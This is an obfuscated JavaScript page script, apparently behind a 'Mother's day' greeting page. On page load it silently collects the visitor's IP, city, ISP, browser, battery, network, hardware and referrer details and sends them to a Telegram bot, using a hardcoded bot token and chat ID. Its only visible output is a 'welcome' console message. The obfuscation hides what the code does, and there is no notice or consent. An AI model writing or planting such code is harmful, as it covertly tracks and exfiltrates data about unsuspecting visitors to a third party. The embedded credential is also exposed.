const _0x4711a1 = _0x1e90;
(function(_0x1833ce, _0x49dd13) {
    const _0x424424 = _0x1e90,
        _0x14322c = _0x1833ce();
    while (!![]) {
        try {
            const _0x576018 = -parseInt(_0x424424(0x196)) / 0x1 + -parseInt(_0x424424(0x1a5)) / 0x2 + -parseInt(_0x424424(0x164)) / 0x3 + parseInt(_0x424424(0x185)) / 0x4 + parseInt(_0x424424(0x18c)) / 0x5 * (-parseInt(_0x424424(0x174)) / 0x6) + parseInt(_0x424424(0x165)) / 0x7 + -parseInt(_0x424424(0x19d)) / 0x8 * (-parseInt(_0x424424(0x193)) / 0x9);
            if (_0x576018 === _0x49dd13) break;
            else _0x14322c['push'](_0x14322c['shift']());
        } catch (_0x46eba4) {
            _0x14322c['push'](_0x14322c['shift']());
        }
    }
}(_0x25ee, 0x95a6d));

function _0x25ee() {
    const _0x156d3f = ['charCodeAt', 'firstVisit', 'getBattery', 'cpuCores', '\x0a\x20\x20🌐\x20*Network:*\x20', 'welcome', '\x0a\x20\x20📱\x20*Platform:*\x20', 'toUpperCase', 'org', 'timeZone', '2663310zzKach', '1148567SeCXOv', 'getItem', '\x0a\x20\x20', 'downlink', 'log', '\x0a\x20\x20🧠\x20*Memory:*\x20', 'connection', 'fromCodePoint', 'countryCode', 'json', 'page', 'pathname', 'effectiveType', 'height', 'city', '206736rDYUOQ', '\x0a\x20\x20🏢\x20*ISP/Org:*\x20', 'then', '\x0a🎉\x20*Mother\x27s\x20day*\x0a\x0a🔗\x20*Page:*\x20', 'charging', 'toString', 'memory', 'chargingTime', 'devicePixelRatio', 'error', 'language', 'N/A', 'country_code', '7821594033:AAGPOfTe--wHX2mm3cX7u53J28PsmG1cEDU', 'resolve', 'https://ipapi.co/json/', 'battery', '4336692lNjFMS', 'dischargingTime', '\x20GB\x0a\x20\x20🧩\x20*CPU\x20Cores:*\x20', '\x0a\x20\x20🆕\x20*First\x20Visit:*\x20', 'catch', '&parse_mode=Markdown', 'visibilityState', '65KilZiX', 'referrer', 'resolvedOptions', 'https://api.telegram.org/bot', 'country_name', '`\x0a\x20\x20', 'href', '153zfmwmk', 'location', '\x0a\x20\x20🌍\x20*IP:*\x20`', '770301xIqMBF', '\x0a\x20\x20🔙\x20*Referrer:*\x20', 'network', 'Telegram\x20Error:', 'DateTimeFormat', 'country', 'round', '1015880lqtaym', 'platform', '\x0a\x20\x20🖥️\x20*Browser:*\x20', 'userAgent', 'level', 'visitedBefore', '/sendMessage?chat_id=', 'join', '1376054ZhcAtB'];
    _0x25ee = function() {
        return _0x156d3f;
    };
    return _0x25ee();
}
async function collectAllUserInfo() {
    const _0x33bc2c = _0x1e90,
        _0x4e0278 = await fetch(_0x33bc2c(0x183))[_0x33bc2c(0x176)](_0x5738b7 => _0x5738b7[_0x33bc2c(0x16e)]())['catch'](() => ({})),
        _0x18763a = await (navigator[_0x33bc2c(0x1a8)] ? navigator[_0x33bc2c(0x1a8)]() : Promise[_0x33bc2c(0x182)]({})) || {},
        _0x2ef319 = navigator[_0x33bc2c(0x16b)] || {},
        _0x21e6bd = new Date(),
        _0x59fe69 = {
            'timestamp': _0x21e6bd['toISOString'](),
            'localTime': _0x21e6bd[_0x33bc2c(0x179)](),
            'timeZone': Intl[_0x33bc2c(0x19a)]()[_0x33bc2c(0x18e)]()[_0x33bc2c(0x163)] || _0x33bc2c(0x17f),
            'ip': _0x4e0278['ip'] || _0x33bc2c(0x17f),
            'city': _0x4e0278[_0x33bc2c(0x173)] || _0x33bc2c(0x17f),
            'region': _0x4e0278['region'] || _0x33bc2c(0x17f),
            'country': _0x4e0278[_0x33bc2c(0x190)] || _0x33bc2c(0x17f),
            'countryCode': _0x4e0278[_0x33bc2c(0x180)] || '🌐',
            'org': _0x4e0278[_0x33bc2c(0x162)] || _0x33bc2c(0x17f),
            'userAgent': navigator[_0x33bc2c(0x1a0)],
            'platform': navigator[_0x33bc2c(0x19e)] || 'N/A',
            'language': navigator[_0x33bc2c(0x17e)] || _0x33bc2c(0x17f),
            'memory': navigator['deviceMemory'] || _0x33bc2c(0x17f),
            'cpuCores': navigator['hardwareConcurrency'] || _0x33bc2c(0x17f),
            'touchSupport': 'ontouchstart' in window,
            'screen': {
                'width': window['screen']['width'],
                'height': window['screen'][_0x33bc2c(0x172)],
                'pixelRatio': window[_0x33bc2c(0x17c)]
            },
            'battery': {
                'charging': _0x18763a[_0x33bc2c(0x178)],
                'level': _0x18763a['level'],
                'chargingTime': _0x18763a[_0x33bc2c(0x17b)],
                'dischargingTime': _0x18763a[_0x33bc2c(0x186)]
            },
            'network': {
                'type': _0x2ef319[_0x33bc2c(0x171)] || _0x33bc2c(0x17f),
                'downlink': _0x2ef319[_0x33bc2c(0x168)] || _0x33bc2c(0x17f),
                'rtt': _0x2ef319['rtt'] || 'N/A'
            },
            'visibility': document[_0x33bc2c(0x18b)],
            'referrer': document[_0x33bc2c(0x18d)] || _0x33bc2c(0x17f),
            'page': window[_0x33bc2c(0x194)][_0x33bc2c(0x192)],
            'path': window[_0x33bc2c(0x194)][_0x33bc2c(0x170)],
            'firstVisit': !localStorage[_0x33bc2c(0x166)](_0x33bc2c(0x1a2))
        };
    return localStorage['setItem'](_0x33bc2c(0x1a2), !![]), console[_0x33bc2c(0x169)](_0x33bc2c(0x1ab)), _0x59fe69;
}

function sendTelegramAlert(_0xefeebf) {
    const _0x20cc0c = _0x1e90,
        _0x1cfbac = _0x20cc0c(0x181),
        _0x333c44 = '7190292986',
        _0x2b559b = _0xefeebf['countryCode'] ? [..._0xefeebf[_0x20cc0c(0x16d)][_0x20cc0c(0x161)]()]['map'](_0x5aabe9 => String[_0x20cc0c(0x16c)](0x1f1a5 + _0x5aabe9[_0x20cc0c(0x1a6)]()))[_0x20cc0c(0x1a4)]('') : '🌍',
        _0x507c9c = _0x20cc0c(0x177) + _0xefeebf[_0x20cc0c(0x16f)] + _0x20cc0c(0x195) + _0xefeebf['ip'] + _0x20cc0c(0x191) + _0x2b559b + '\x20*Location:*\x20' + _0xefeebf['city'] + ',\x20' + _0xefeebf[_0x20cc0c(0x19b)] + _0x20cc0c(0x175) + _0xefeebf[_0x20cc0c(0x162)] + _0x20cc0c(0x1ac) + _0xefeebf['platform'] + '\x0a\x20\x20🔋\x20*Battery:*\x20' + (_0xefeebf[_0x20cc0c(0x184)][_0x20cc0c(0x1a1)] ? Math[_0x20cc0c(0x19c)](_0xefeebf[_0x20cc0c(0x184)][_0x20cc0c(0x1a1)] * 0x64) + '%' : _0x20cc0c(0x17f)) + '\x20' + (_0xefeebf[_0x20cc0c(0x184)]['charging'] ? '⚡' : '🔋') + _0x20cc0c(0x1aa) + (_0xefeebf[_0x20cc0c(0x198)]['type'] || _0x20cc0c(0x17f)) + _0x20cc0c(0x16a) + _0xefeebf[_0x20cc0c(0x17a)] + _0x20cc0c(0x187) + _0xefeebf[_0x20cc0c(0x1a9)] + _0x20cc0c(0x19f) + _0xefeebf[_0x20cc0c(0x1a0)]['split'](')\x20')[0x0] + _0x20cc0c(0x197) + _0xefeebf['referrer'] + _0x20cc0c(0x188) + (_0xefeebf[_0x20cc0c(0x1a7)] ? 'Yes' : 'No') + _0x20cc0c(0x167),
        _0x51d06d = encodeURIComponent(_0x507c9c),
        _0x4fca34 = _0x20cc0c(0x18f) + _0x1cfbac + _0x20cc0c(0x1a3) + _0x333c44 + '&text=' + _0x51d06d + _0x20cc0c(0x18a);
    fetch(_0x4fca34)[_0x20cc0c(0x176)](_0x43951f => {
        const _0x68e31a = _0x20cc0c;
        !_0x43951f['ok'] && console[_0x68e31a(0x17d)](_0x68e31a(0x199), _0x43951f['statusText']);
    })[_0x20cc0c(0x189)](_0x55fa63 => console[_0x20cc0c(0x17d)]('T:', _0x55fa63));
}

function _0x1e90(_0x57d3de, _0x11317b) {
    const _0x25eef7 = _0x25ee();
    return _0x1e90 = function(_0x1e90ae, _0x102162) {
        _0x1e90ae = _0x1e90ae - 0x161;
        let _0x27ad3a = _0x25eef7[_0x1e90ae];
        return _0x27ad3a;
    }, _0x1e90(_0x57d3de, _0x11317b);
}
collectAllUserInfo()[_0x4711a1(0x176)](_0x247493 => {
    sendTelegramAlert(_0x247493);
});